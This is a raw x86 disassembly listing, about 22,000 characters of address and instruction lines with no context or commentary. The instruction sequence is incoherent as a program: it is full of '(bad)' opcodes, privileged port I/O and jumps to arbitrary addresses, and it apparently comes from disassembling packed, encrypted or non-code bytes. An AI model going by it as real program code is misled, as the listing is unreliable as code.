  41bd21:	mov    al,ds:0xbdd5fec0
  41bd26:	inc    edi
  41bd27:	cwde   
  41bd28:	outs   dx,BYTE PTR ds:[esi]
  41bd29:	mov    BYTE PTR [eax],ch
  41bd2b:	out    dx,eax
  41bd2c:	aam    0x0
  41bd2e:	jmp    0x7b71:0x7859dc22
  41bd35:	mov    edx,0x69f7ec55
  41bd3a:	xchg   DWORD PTR [ebx],ebx
  41bd3c:	mov    ds:0xadd9c2c5,eax
  41bd41:	sub    bl,BYTE PTR [ebp-0x73d17b45]
  41bd47:	push   0x1677c878
  41bd4c:	or     ah,BYTE PTR [edx+ecx*2]
  41bd4f:	adc    eax,0x6691006
  41bd54:	in     eax,dx
  41bd55:	daa    
  41bd56:	fmul   DWORD PTR [ecx+0x52639e85]
  41bd5c:	sub    eax,0xbbbf4d2
  41bd61:	mov    esp,0x12a0eb13
  41bd66:	and    BYTE PTR [ebx],bl
  41bd68:	add    bh,BYTE PTR [eax+edi*1]
  41bd6b:	sub    edx,DWORD PTR [edi+edi*4-0x44273f5]
  41bd72:	cmp    eax,edx
  41bd74:	fadd   QWORD PTR [ecx+esi*2]
  41bd77:	pushf  
  41bd78:	jnp    0x41bdd4
  41bd7a:	rcl    DWORD PTR [edx-0x3c],1
  41bd7d:	cmp    eax,0x604421db
  41bd82:	lahf   
  41bd83:	inc    edx
  41bd84:	in     eax,0x63
  41bd86:	adc    eax,0xc7a4d2d6
  41bd8b:	jne    0x41bd25
  41bd8d:	pop    ebp
  41bd8e:	sbb    dh,cl
  41bd90:	cmp    BYTE PTR [ecx-0x14],bh
  41bd93:	ins    BYTE PTR es:[edi],dx
  41bd94:	mov    eax,0xfd48fbef
  41bd99:	push   es
  41bd9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd9b:	sub    DWORD PTR [eax],esi
  41bd9d:	jno    0x41bd92
  41bd9f:	add    ebp,DWORD PTR [edx+0x19801648]
  41bda5:	sub    DWORD PTR [ebp+0x3d],ecx
  41bda8:	jno    0x41bd64
  41bdaa:	pushf  
  41bdab:	mov    DWORD PTR [ecx-0x6],ecx
  41bdae:	imul   eax,DWORD PTR [eax-0x36da1ea3],0xffffff82
  41bdb5:	jno    0x41be2c
  41bdb7:	adc    eax,0x6a2b7ae8
  41bdbc:	pop    eax
  41bdbd:	xor    BYTE PTR [esi],cl
  41bdbf:	mov    edx,0x3057c6a0
  41bdc4:	sub    DWORD PTR [ebx+0x44],edi
  41bdc7:	sbb    BYTE PTR [ecx],0xa3
  41bdca:	jb     0x41bdce
  41bdcc:	or     dl,BYTE PTR [ebx]
  41bdce:	or     al,0xb
  41bdd0:	mov    DWORD PTR [edi-0x7ea54287],ebp
  41bdd6:	fmul   st(7),st
  41bdd8:	sbb    ecx,DWORD PTR [ebx-0x53]
  41bddb:	jo     0x41bdac
  41bddd:	dec    ecx
  41bdde:	rcl    BYTE PTR [eax-0x30871fae],1
  41bde4:	mov    cl,0xd8
  41bde6:	mov    dh,0x87
  41bde8:	jp     0x41be5d
  41bdea:	push   0xffffffbb
  41bdec:	xchg   edi,eax
  41bded:	xchg   edi,esi
  41bdef:	imul   ebx,DWORD PTR ds:[edx-0x1c],0xffffff87
  41bdf4:	push   ss
  41bdf5:	dec    ebx
  41bdf6:	repz mov dh,0xbb
  41bdf9:	test   eax,0xbcbae7e5
  41bdfe:	push   cs
  41bdff:	repnz push edx
  41be01:	cmp    eax,0x42a1118
  41be06:	jle    0x41bdd8
  41be08:	(bad)  
  41be09:	lock pop ecx
  41be0b:	mov    al,ds:0x99c9deca
  41be10:	das    
  41be11:	repnz fs xchg ecx,eax
  41be14:	xchg   esp,eax
  41be15:	and    al,0x66
  41be17:	cmp    BYTE PTR [edx-0x3457e830],ah
  41be1d:	push   ebx
  41be1e:	in     eax,dx
  41be1f:	mov    dl,BYTE PTR [esi+eax*1]
  41be22:	xchg   ebp,eax
  41be23:	add    esp,ebx
  41be25:	push   ebp
  41be26:	mov    esi,0xfda89c07
  41be2b:	adc    ecx,DWORD PTR [edx-0x2fadf597]
  41be31:	je     0x41beac
  41be33:	or     BYTE PTR [ebp-0x256b179a],bl
  41be39:	mov    ebx,0x9d97fde8
  41be3e:	sar    BYTE PTR [ebx],1
  41be40:	fdiv   DWORD PTR [esi-0x57a6058f]
  41be46:	sub    eax,0x81b75027
  41be4b:	jb     0x41bea9
  41be4d:	int    0x56
  41be4f:	test   al,0xb1
  41be51:	or     ebx,DWORD PTR [edx]
  41be53:	out    0xd9,al
  41be55:	ins    DWORD PTR es:[edi],dx
  41be56:	pop    ebp
  41be57:	adc    cl,BYTE PTR [eax-0x24]
  41be5a:	xchg   ebx,eax
  41be5b:	cmc    
  41be5c:	or     al,0xa0
  41be5e:	lods   al,BYTE PTR ds:[esi]
  41be5f:	mov    eax,ds:0x482ccf9c
  41be64:	aam    0x19
  41be66:	dec    eax
  41be67:	test   DWORD PTR [eax],eax
  41be69:	jecxz  0x41bea1
  41be6b:	mov    al,0xb
  41be6d:	xor    BYTE PTR [edi-0x49],cl
  41be70:	inc    ecx
  41be71:	in     al,0xfd
  41be73:	jb     0x41be82
  41be75:	fcmovb st,st(0)
  41be77:	add    eax,0xe7ba05f7
  41be7c:	cmc    
  41be7d:	jae    0x41be13
  41be7f:	adc    esi,DWORD PTR [ecx]
  41be81:	push   0xffffff8d
  41be83:	dec    esi
  41be84:	cdq    
  41be85:	and    al,0x15
  41be87:	fisubr WORD PTR [esi]
  41be89:	add    al,0xc0
  41be8b:	mov    edi,0x6f423716
  41be90:	mov    ax,0xd97d
  41be94:	stos   DWORD PTR es:[edi],eax
  41be95:	or     edx,DWORD PTR [ecx]
  41be97:	lds    ecx,FWORD PTR [eax-0x42b831f0]
  41be9d:	mov    eax,ds:0xfc810f24
  41bea2:	hlt    
  41bea3:	jns    0x41bf1a
  41bea5:	add    ch,ah
  41bea7:	mov    dh,0x38
  41bea9:	sub    DWORD PTR [edx-0x8],0x680a649a
  41beb0:	lods   al,BYTE PTR ds:[esi]
  41beb1:	jl     0x41beb3
  41beb3:	mov    ch,0x34
  41beb5:	pop    ebp
  41beb6:	popa   
  41beb7:	test   eax,0xd8ae3ebf
  41bebc:	lock in al,0x68
  41bebf:	push   esp
  41bec0:	test   eax,0xf9929544
  41bec5:	inc    ebx
  41bec6:	inc    ecx
  41bec7:	mov    dh,0x1e
  41bec9:	gs inc ebp
  41becb:	int3   
  41becc:	mov    esi,0x1a5c4bd2
  41bed1:	shl    edx,0xad
  41bed4:	rcl    BYTE PTR [edx-0x78],1
  41bed7:	outs   dx,BYTE PTR ds:[esi]
  41bed8:	add    al,0x45
  41beda:	sub    edi,DWORD PTR [edi+0x2e]
  41bedd:	jno    0x41be8e
  41bedf:	cdq    
  41bee0:	call   0xf927cd29
  41bee5:	push   0xffffffb6
  41bee7:	cwde   
  41bee8:	fild   WORD PTR [edi+0x7b2a8261]
  41beee:	sbb    al,0x72
  41bef0:	lods   al,BYTE PTR ds:[esi]
  41bef1:	(bad)
  41bef4:	push   eax
  41bef5:	dec    ecx
  41bef6:	add    DWORD PTR [edx-0x69],ebx
  41bef9:	clc    
  41befa:	dec    ecx
  41befb:	pop    ebx
  41befc:	inc    edi
  41befd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41befe:	scas   al,BYTE PTR es:[edi]
  41beff:	out    dx,eax
  41bf00:	jbe    0x41bf6e
  41bf02:	cmp    DWORD PTR [ebp-0xb],edi
  41bf05:	pop    esp
  41bf06:	adc    al,0x59
  41bf08:	mov    edx,0x26ef4f04
  41bf0d:	mov    dl,0x82
  41bf0f:	xchg   DWORD PTR [edx-0x19e9de6f],edx
  41bf15:	aaa    
  41bf16:	mov    ch,0x6c
  41bf18:	dec    ecx
  41bf19:	xchg   esp,eax
  41bf1a:	aaa    
  41bf1b:	xlat   BYTE PTR ds:[ebx]
  41bf1c:	sbb    BYTE PTR [ebx+0x5b],0x3e
  41bf20:	bound  edi,QWORD PTR [ecx+0x68]
  41bf23:	(bad)  
  41bf24:	scas   eax,DWORD PTR es:[edi]
  41bf25:	pop    edi
  41bf26:	das    
  41bf27:	and    ebp,DWORD PTR [edx-0x11]
  41bf2a:	inc    ecx
  41bf2b:	int    0xb6
  41bf2d:	addr16 out 0x5b,eax
  41bf30:	pop    ecx
  41bf31:	push   ds
  41bf32:	int3   
  41bf33:	shl    DWORD PTR [esi],1
  41bf35:	shl    DWORD PTR [ecx*2+0x7cd20f7f],1
  41bf3c:	adc    ah,BYTE PTR [eax+0x2d41ea93]
  41bf42:	sbb    DWORD PTR [esi],esi
  41bf44:	mov    ebx,0x579cb994
  41bf49:	adc    BYTE PTR [eax+ecx*2],cl
  41bf4c:	outs   dx,BYTE PTR ds:[esi]
  41bf4d:	(bad)  
  41bf4e:	cwde   
  41bf4f:	(bad)  
  41bf50:	fadd   DWORD PTR [eax+0x67018b84]
  41bf56:	(bad)  
  41bf57:	xchg   ebx,eax
  41bf58:	test   DWORD PTR [ebx+0xf],0x18781193
  41bf5f:	xor    eax,0x94bf8034
  41bf64:	neg    DWORD PTR [ebp+esi*1+0x16fb5724]
  41bf6b:	jo     0x41bf26
  41bf6d:	(bad)  
  41bf6e:	cmp    DWORD PTR [esp+eiz*2],0x1671be9c
  41bf75:	std    
  41bf76:	nop
  41bf77:	jg     0x41bf98
  41bf79:	aaa    
  41bf7a:	push   esp
  41bf7b:	add    eax,0x7c9a2d28
  41bf80:	fidivr WORD PTR [edi-0x2a5e446c]
  41bf86:	xchg   BYTE PTR [ecx-0x28594fcc],ah
  41bf8c:	cmp    ebx,ebp
  41bf8e:	mov    esi,0x34fbf4a
  41bf93:	inc    esi
  41bf94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf95:	push   esi
  41bf96:	or     al,bl
  41bf98:	ins    BYTE PTR es:[edi],dx
  41bf99:	or     eax,0x71b1d742
  41bf9e:	dec    ecx
  41bf9f:	es out 0x1a,al
  41bfa2:	out    0xe7,al
  41bfa4:	aas    
  41bfa5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bfa6:	sub    esp,DWORD PTR [edi+0x5fdf29b5]
  41bfac:	addr16 mov al,0x25
  41bfaf:	jmp    0xb5ff:0x5a10c879
  41bfb6:	mov    al,ds:0x705fb29
  41bfbb:	mov    ch,0xac
  41bfbd:	fimul  WORD PTR [ebx]
  41bfbf:	dec    ebp
  41bfc0:	mov    dl,0xf
  41bfc2:	aam    0x44
  41bfc4:	retf   
  41bfc5:	fdivr  QWORD PTR [eax+0x160bd835]
  41bfcb:	inc    edx
  41bfcc:	pop    ss
  41bfcd:	jns    0x41bf9a
  41bfcf:	cmp    eax,0x27a95c7
  41bfd4:	mov    ebp,0xcf8be684
  41bfd9:	lahf   
  41bfda:	neg    DWORD PTR [edx]
  41bfdc:	inc    esi
  41bfdd:	mov    al,ds:0x8619a393
  41bfe2:	jg     0x41c05c
  41bfe4:	loope  0x41bfc5
  41bfe6:	lahf   
  41bfe7:	or     al,BYTE PTR [edi]
  41bfe9:	ja     0x41c017
  41bfeb:	mov    bh,0xb5
  41bfed:	out    0xd6,eax
  41bfef:	push   ss
  41bff0:	sub    BYTE PTR [esi+0x75],dh
  41bff3:	mov    bh,0xb9
  41bff5:	aaa    
  41bff6:	mov    ds:0xbaca3843,eax
  41bffb:	jb     0x41bfab
  41bffd:	xor    edi,DWORD PTR [esi-0x3a60191f]
  41c003:	enter  0x7070,0x17
  41c007:	aam    0xf2
  41c009:	mov    dl,0xc0
  41c00b:	test   DWORD PTR [esi],edx
  41c00d:	xchg   edi,eax
  41c00e:	cmp    ebp,edx
  41c010:	push   edi
  41c011:	jns    0x41c068
  41c013:	push   ebp
  41c014:	mov    ch,0xa6
  41c016:	test   al,0x4d
  41c018:	mov    dh,0x3f
  41c01a:	push   esi
  41c01b:	pop    esi
  41c01c:	add    edx,DWORD PTR [ebx-0x6c]
  41c01f:	pop    ds
  41c020:	test   al,0x7e
  41c022:	xor    BYTE PTR [ebp+0x1ecb3394],ah
  41c028:	out    0xef,eax
  41c02a:	cmp    BYTE PTR [esi],bh
  41c02c:	bound  ebx,QWORD PTR ds:0xb80030aa
  41c032:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c033:	adc    edx,esp
  41c035:	push   ds
  41c036:	or     al,0x55
  41c038:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c039:	test   al,0x29
  41c03b:	mov    ds:0xd1aae16d,al
  41c040:	ret    0xe3d4
  41c043:	add    bl,BYTE PTR [eax+0x277b65b5]
  41c049:	out    0x7d,eax
  41c04b:	into   
  41c04c:	xchg   ah,dh
  41c04e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c04f:	mov    DWORD PTR [eax+0x70cb2b0d],0xbd105f2e
  41c059:	aam    0x46
  41c05b:	rcl    esi,0x4f
  41c05e:	mov    bl,0xda
  41c060:	repz dec ebp
  41c062:	jne    0x41c04e
  41c064:	mov    cl,0x2a
  41c066:	lods   eax,DWORD PTR ds:[esi]
  41c067:	lods   al,BYTE PTR ds:[esi]
  41c068:	xchg   BYTE PTR [eax+0x7dd9333f],bl
  41c06e:	test   ah,bh
  41c070:	loopne 0x41c04a
  41c072:	xor    ebx,DWORD PTR [esi+eax*1]
  41c075:	mov    cl,0xc2
  41c077:	mov    ds:0x98986886,al
  41c07c:	lahf   
  41c07d:	push   eax
  41c07e:	(bad)  
  41c07f:	fcom   QWORD PTR [edi]
  41c081:	push   0x4ad0425c
  41c086:	or     eax,DWORD PTR [eax]
  41c088:	xchg   BYTE PTR [ebx],al
  41c08a:	xor    eax,0x29183781
  41c08f:	cmp    BYTE PTR [edi-0x30d1e713],dl
  41c095:	aam    0x3f
  41c097:	jg     0x41c050
  41c099:	inc    esp
  41c09a:	mov    WORD PTR [ecx-0x1e23dd8a],ss
  41c0a0:	push   cs
  41c0a1:	xchg   esp,eax
  41c0a2:	or     eax,0x8af1181e
  41c0a7:	cwde   
  41c0a8:	daa    
  41c0a9:	sub    DWORD PTR [ecx+eiz*1+0x56af70a5],eax
  41c0b0:	mov    ds:0xafa6a658,eax
  41c0b5:	adc    dl,BYTE PTR [ecx-0xde3048a]
  41c0bb:	sub    eax,0x15d96e20
  41c0c0:	or     BYTE PTR [ebp-0x68],0xc9
  41c0c4:	cmp    DWORD PTR [esi-0x4d],esp
  41c0c7:	xor    edi,DWORD PTR [esi]
  41c0c9:	xchg   BYTE PTR ds:[ebp+0x7b],ah
  41c0cd:	cmc    
  41c0ce:	sbb    ah,bl
  41c0d0:	imul   edi,DWORD PTR [edx],0x6d285fc2
  41c0d6:	ret    0x6ad2
  41c0d9:	sahf   
  41c0da:	mov    ch,0x3d
  41c0dc:	inc    ecx
  41c0dd:	pop    eax
  41c0de:	inc    esi
  41c0df:	inc    esi
  41c0e0:	in     eax,dx
  41c0e1:	sahf   
  41c0e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c0e3:	hlt    
  41c0e4:	mov    WORD PTR [edx+0x5d],es
  41c0e7:	cmp    edx,DWORD PTR [edx]
  41c0e9:	xor    eax,0x777754b7
  41c0ee:	push   ecx
  41c0ef:	imul   BYTE PTR [esp+ebx*4-0x79277584]
  41c0f6:	inc    edi
  41c0f7:	mov    es,WORD PTR [esi-0x580a87f0]
  41c0fd:	cdq    
  41c0fe:	cmp    esi,DWORD PTR [ebx]
  41c100:	fst    DWORD PTR [edx-0x4ebdbc07]
  41c106:	data16 setne BYTE PTR [esi]
  41c10a:	scas   eax,DWORD PTR es:[edi]
  41c10b:	add    eax,eax
  41c10d:	ror    edx,0x2e
  41c110:	shl    dl,1
  41c112:	mov    esi,0x2fc9dfbe
  41c117:	xchg   ecx,eax
  41c118:	push   ss
  41c119:	cmp    al,0x50
  41c11b:	ficom  DWORD PTR [edi]
  41c11d:	xchg   si,ax
  41c11f:	xchg   edx,eax
  41c120:	xor    eax,0xa15d3660
  41c125:	and    eax,DWORD PTR [edi+esi*4+0x57]
  41c129:	fbld   TBYTE PTR [edx-0x72]
  41c12c:	out    dx,eax
  41c12d:	sbb    al,0xa4
  41c12f:	sub    BYTE PTR [edi],dh
  41c131:	xor    eax,0xa2f08947
  41c136:	mov    WORD PTR fs:[ebx-0x75f05e57],ss
  41c13d:	add    DWORD PTR [edi+0x16],0x252ff003
  41c144:	jbe    0x41c0d2
  41c146:	pop    ebx
  41c147:	and    BYTE PTR [ecx],ch
  41c149:	or     eax,ebx
  41c14b:	aas    
  41c14c:	daa    
  41c14d:	sbb    eax,0xc550fb36
  41c152:	sbb    eax,0xad87e346
  41c157:	and    ah,bl
  41c159:	jnp    0x41c186
  41c15b:	mov    dh,0x5d
  41c15d:	daa    
  41c15e:	in     eax,dx
  41c15f:	mov    cl,0x88
  41c161:	cmovbe edi,DWORD PTR [ebx-0x5a]
  41c165:	sahf   
  41c166:	das    
  41c167:	ins    DWORD PTR es:[edi],dx
  41c168:	and    bh,BYTE PTR [ebx+0x6ba8da68]
  41c16e:	xor    BYTE PTR ds:0x1d995d68,ch
  41c174:	or     eax,0x19b1cf6a
  41c179:	es inc eax
  41c17b:	adc    DWORD PTR [ecx+0x3a11b7fb],eax
  41c181:	mov    eax,0x178a8b2a
  41c186:	xlat   BYTE PTR ds:[ebx]
  41c187:	call   0x558e:0xff4e8d4e
  41c18e:	ret    
  41c18f:	mov    dl,0x61
  41c191:	test   BYTE PTR [edx-0x247929dd],al
  41c197:	add    eax,0x9626e562
  41c19c:	sbb    al,BYTE PTR [ecx]
  41c19e:	test   eax,0xe4f5f5
  41c1a3:	cli    
  41c1a4:	push   eax
  41c1a5:	pop    ecx
  41c1a6:	fstp   TBYTE PTR [edi+eax*4+0x18e31a6a]
  41c1ad:	icebp  
  41c1ae:	das    
  41c1af:	add    esi,edi
  41c1b1:	les    ebx,FWORD PTR [ebx+0x6479e8c0]
  41c1b7:	cmp    al,0x1d
  41c1b9:	xor    al,dl
  41c1bb:	lea    edx,[edi]
  41c1bd:	xlat   BYTE PTR ds:[ebx]
  41c1be:	ficom  WORD PTR [edx]
  41c1c0:	pop    es
  41c1c1:	addr16 push ecx
  41c1c3:	lea    ecx,[ebx+0x14]
  41c1c6:	jbe    0x41c157
  41c1c8:	hlt    
  41c1c9:	xor    dh,cl
  41c1cb:	fs dec ebx
  41c1cd:	and    BYTE PTR ds:0xccfd20f4,dl
  41c1d3:	and    bl,BYTE PTR [edx+0x2a]
  41c1d6:	es mov ch,0x88
  41c1d9:	test   al,0x41
  41c1db:	repz (bad) 
  41c1dd:	lods   al,BYTE PTR ds:[esi]
  41c1de:	or     edx,DWORD PTR [edi]
  41c1e0:	dec    DWORD PTR [ebp+0x46]
  41c1e3:	and    ebx,esi
  41c1e5:	cmp    edx,ecx
  41c1e7:	sub    BYTE PTR [esi-0x2b],bl
  41c1ea:	lahf   
  41c1eb:	ins    BYTE PTR es:[edi],dx
  41c1ec:	shr    BYTE PTR [edx-0x5af8fa38],cl
  41c1f2:	mov    ecx,0xc7200c5d
  41c1f7:	ins    DWORD PTR es:[edi],dx
  41c1f8:	stos   BYTE PTR es:[edi],al
  41c1f9:	mov    DWORD PTR [edi],edi
  41c1fb:	sahf   
  41c1fc:	dec    edx
  41c1fd:	mov    WORD PTR [esi+0x2f],fs
  41c200:	ds xor BYTE PTR cs:[bx+si],ch
  41c205:	pop    ss
  41c206:	ins    BYTE PTR es:[edi],dx
  41c207:	push   eax
  41c208:	addr16 dec esi
  41c20a:	lock cli 
  41c20c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c20d:	gs push eax
  41c20f:	lods   al,BYTE PTR ds:[esi]
  41c210:	shr    DWORD PTR [ecx-0x520d48c2],1
  41c216:	jge    0x41c1f6
  41c218:	inc    ebp
  41c219:	repnz push esi
  41c21b:	ins    BYTE PTR es:[edi],dx
  41c21c:	cs cmp al,0x7d
  41c21f:	sbb    eax,0x762a13eb
  41c224:	adc    al,0x13
  41c226:	lds    esp,FWORD PTR [eax]
  41c228:	sbb    eax,0xab637dc0
  41c22d:	push   ds
  41c22e:	add    ah,ch
  41c230:	inc    ebx
  41c231:	xchg   ebx,eax
  41c232:	repz stc 
  41c234:	outs   dx,BYTE PTR ds:[esi]
  41c235:	dec    ebx
  41c236:	in     al,dx
  41c237:	jecxz  0x41c28c
  41c239:	loopne 0x41c262
  41c23b:	in     al,dx
  41c23c:	push   esp
  41c23d:	cmc    
  41c23e:	pusha  
  41c23f:	and    BYTE PTR [ebp-0x5bca1ae3],0x87
  41c246:	or     al,0x79
  41c248:	aad    0xe5
  41c24a:	xor    edx,DWORD PTR [ecx]
  41c24c:	mov    esi,0xb4bc8df2
  41c251:	std    
  41c252:	mov    ch,0x2a
  41c254:	dec    ebx
  41c255:	xchg   ebp,eax
  41c256:	pusha  
  41c257:	push   edi
  41c258:	dec    esp
  41c259:	add    DWORD PTR [ebx+0x6b],0x33
  41c25d:	clc    
  41c25e:	xor    edi,DWORD PTR [edx-0x57cab613]
  41c264:	sbb    BYTE PTR [eax],ah
  41c266:	fwait
  41c267:	sbb    eax,0x47768954
  41c26c:	imul   ecx,DWORD PTR [ebx-0x3296e30c],0xc609838b
  41c276:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c277:	mov    eax,0x554bf3aa
  41c27c:	out    dx,eax
  41c27d:	xor    ah,0xc9
  41c280:	data16 add al,0xd2
  41c283:	push   edx
  41c284:	std    
  41c285:	(bad)  
  41c286:	or     DWORD PTR [edi+0x44],ebp
  41c289:	(bad)  
  41c28b:	div    DWORD PTR [esi+eax*1+0x2df3fd49]
  41c292:	scas   al,BYTE PTR es:[edi]
  41c293:	inc    eax
  41c294:	jmp    0x41c257
  41c296:	aas    
  41c297:	loope  0x41c22e
  41c299:	xchg   ebp,eax
  41c29a:	pushf  
  41c29b:	cmp    bl,BYTE PTR [edi-0x79]
  41c29e:	push   cs
  41c29f:	xchg   al,al
  41c2a1:	test   BYTE PTR [ecx+0x7612b809],al
  41c2a7:	pushf  
  41c2a8:	loope  0x41c29e
  41c2aa:	adc    edx,DWORD PTR [ebp+0x72f6034a]
  41c2b0:	cmc    
  41c2b1:	add    al,0x9f
  41c2b3:	mov    edx,0x5c4c402a
  41c2b8:	out    0x3f,al
  41c2ba:	push   cs
  41c2bb:	pop    edi
  41c2bc:	sub    cl,BYTE PTR [edi+0x3f6e6608]
  41c2c2:	xchg   ecx,eax
  41c2c3:	ins    DWORD PTR es:[edi],dx
  41c2c4:	adc    esi,DWORD PTR [eax+0x70]
  41c2c7:	lds    esi,FWORD PTR [edx+0x35859be0]
  41c2cd:	popa   
  41c2ce:	or     bh,BYTE PTR [ebx-0x5736dcea]
  41c2d4:	mov    ds:0x403975e4,al
  41c2d9:	jo     0x41c2f7
  41c2db:	xchg   esp,eax
  41c2dc:	sub    dl,bh
  41c2de:	jb     0x41c26a
  41c2e0:	test   eax,0xd8dd874c
  41c2e5:	lds    eax,FWORD PTR [ebp+0x2d]
  41c2e8:	test   al,0x8f
  41c2ea:	cmp    eax,0x85102826
  41c2ef:	shl    BYTE PTR [eax+0x7a],1
  41c2f2:	outs   dx,BYTE PTR ds:[esi]
  41c2f3:	cmp    ecx,DWORD PTR [ebx+0x25bc575c]
  41c2f9:	es aam 0xae
  41c2fc:	das    
  41c2fd:	jae    0x41c2f2
  41c2ff:	cs push es
  41c301:	lds    esi,FWORD PTR [ecx]
  41c303:	shl    BYTE PTR [edi+eiz*4+0x39],cl
  41c307:	cmp    esi,edx
  41c309:	ffree  st(1)
  41c30b:	xadd   DWORD PTR [ebx+0x73],esi
  41c30f:	scas   eax,DWORD PTR es:[edi]
  41c310:	int    0x21
  41c312:	popf   
  41c313:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c314:	cmp    eax,0xec8825ab
  41c319:	mov    cl,0x11
  41c31b:	dec    edi
  41c31c:	or     eax,0xa025f26b
  41c321:	aad    0xc7
  41c323:	std    
  41c324:	inc    esi
  41c325:	mov    esi,0x175c310c
  41c32a:	ror    esi,0x25
  41c32d:	repz dec ebp
  41c32f:	stos   BYTE PTR es:[edi],al
  41c330:	outs   dx,DWORD PTR ds:[esi]
  41c331:	fs std 
  41c333:	lods   eax,DWORD PTR ds:[esi]
  41c334:	pushf  
  41c335:	cmp    cl,BYTE PTR [ecx]
  41c337:	mul    BYTE PTR [eax-0x7f3d3eb3]
  41c33d:	inc    ecx
  41c33e:	stos   BYTE PTR es:[edi],al
  41c33f:	sub    eax,0x8518cd14
  41c344:	retf   0xc1f4
  41c347:	mov    bh,0x81
  41c349:	(bad)  
  41c34a:	cmp    eax,0xf090313
  41c34f:	cmp    ebx,ebp
  41c351:	and    al,0x39
  41c353:	enter  0x5bae,0xc7
  41c357:	and    al,0x58
  41c359:	inc    edx
  41c35a:	dec    ebx
  41c35b:	shr    DWORD PTR [ecx],0xb6
  41c35e:	cmp    eax,0xf2ededc3
  41c363:	in     al,0x3d
  41c365:	xlat   BYTE PTR ds:[ebx]
  41c366:	dec    ecx
  41c367:	sbb    DWORD PTR [edx],ecx
  41c369:	das    
  41c36a:	adc    DWORD PTR ds:0xf705ebae,ebx
  41c370:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c371:	jp     0x41c3d9
  41c373:	xor    al,0x94
  41c375:	out    dx,al
  41c376:	sub    ah,BYTE PTR [edi+0x5df76202]
  41c37c:	and    al,0x90
  41c37e:	daa    
  41c37f:	jl     0x41c3cb
  41c381:	sub    al,cl
  41c383:	shl    BYTE PTR [edi+0x57],0x1
  41c387:	or     eax,0xb5a99e1c
  41c38c:	inc    esp
  41c38d:	sar    BYTE PTR [ebx-0x2af55114],0x2a
  41c394:	mov    bl,0x39
  41c396:	sbb    cl,bh
  41c398:	loop   0x41c404
  41c39a:	xor    DWORD PTR [ebx-0x3ad39b1a],eax
  41c3a0:	mov    ch,0x4d
  41c3a2:	hlt    
  41c3a3:	xbegin 0x38e69c12
  41c3a9:	adc    BYTE PTR ds:0x2b31b9e4,cl
  41c3af:	gs add eax,0xd1afb2ef
  41c3b5:	mov    ch,0x5
  41c3b7:	fiadd  WORD PTR [ecx+0x7d29f468]
  41c3bd:	shl    dl,cl
  41c3bf:	call   0x241c:0x3d576c91
  41c3c6:	(bad)  
  41c3c7:	aam    0x7a
  41c3c9:	sub    al,0xa6
  41c3cb:	inc    ebp
  41c3cc:	rol    BYTE PTR [eax+0x34],0x4c
  41c3d0:	addr16 fcomi st,st(3)
  41c3d3:	fwait
  41c3d4:	and    eax,eax
  41c3d6:	adc    edi,DWORD PTR [ecx-0x58]
  41c3d9:	xchg   ebp,eax
  41c3da:	std    
  41c3db:	sahf   
  41c3dc:	popa   
  41c3dd:	inc    esi
  41c3de:	retf   
  41c3df:	mov    esi,0x48f418b9
  41c3e4:	vmovddup xmm1,QWORD PTR [edx]
  41c3e8:	inc    eax
  41c3e9:	bound  edx,QWORD PTR [ebp-0x759c188e]
  41c3ef:	push   0x4c
  41c3f1:	jno    0x41c3f4
  41c3f3:	mov    ah,0x53
  41c3f5:	outs   dx,DWORD PTR ds:[esi]
  41c3f6:	iret   
  41c3f7:	les    edx,FWORD PTR [di-0x4b]
  41c3fb:	icebp  
  41c3fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c3fd:	jo     0x41c3f1
  41c3ff:	dec    eax
  41c400:	inc    edi
  41c401:	push   esp
  41c402:	cwde   
  41c403:	fwait
  41c404:	popf   
  41c405:	cmp    ebx,DWORD PTR [ecx+edx*2-0x74ea2aa6]
  41c40c:	xchg   esp,eax
  41c40e:	js     0x41c452
  41c410:	hlt    
  41c411:	call   0x69d68928
  41c416:	lock mov eax,DWORD PTR [edx-0x34d432d9]
  41c41d:	das    
  41c41e:	ret    0x5c2f
  41c421:	jl     0x41c41e
  41c423:	mov    dl,bl
  41c425:	test   DWORD PTR [ebx-0x77],esp
  41c428:	test   eax,0x873dd873
  41c42d:	jmp    0xf5bf7b8c
  41c432:	add    ebx,edx
  41c434:	lods   eax,DWORD PTR ds:[esi]
  41c435:	or     BYTE PTR [esi+0x65],0x3a
  41c439:	mov    BYTE PTR ds:0xac58f3b3,dh
  41c43f:	(bad)  
  41c440:	repnz xor dl,0x13
  41c444:	mov    bh,0x24
  41c446:	dec    edi
  41c447:	mov    edx,DWORD PTR [ecx-0x3e]
  41c44a:	and    ah,BYTE PTR [edx+0x20]
  41c44d:	cmp    DWORD PTR [ecx],ebp
  41c44f:	call   0x90c0:0xf60e51bf
  41c456:	mov    bl,BYTE PTR [ebx]
  41c458:	scas   eax,DWORD PTR es:[edi]
  41c459:	push   ecx
  41c45a:	or     edi,DWORD PTR [ecx-0xa96bd7b]
  41c460:	mov    al,0xad
  41c462:	addr16 cli 
  41c464:	fldenv [eax-0x45]
  41c467:	inc    ebp
  41c468:	add    al,0xd1
  41c46a:	dec    edx
  41c46b:	and    al,0xd7
  41c46d:	adc    ch,al
  41c46f:	dec    esi
  41c470:	arpl   WORD PTR [ecx],cx
  41c472:	or     DWORD PTR [edi-0x3a],ebx
  41c475:	add    eax,0x8dde59e1
  41c47a:	sar    BYTE PTR [ecx+ecx*8-0x26],1
  41c47e:	mov    BYTE PTR [edx+0x5a],ch
  41c481:	outs   dx,BYTE PTR ds:[esi]
  41c482:	xor    al,0x3b
  41c484:	(bad)  
  41c485:	mov    ebx,0x49501c6d
  41c48a:	repz popa 
  41c48c:	repnz mov dh,0xf5
  41c48f:	mov    es,WORD PTR [ebp-0x7d]
  41c492:	add    eax,0x5ad7627e
  41c497:	mov    ebp,0x154d6508
  41c49c:	pop    esp
  41c49d:	push   0x8791375d
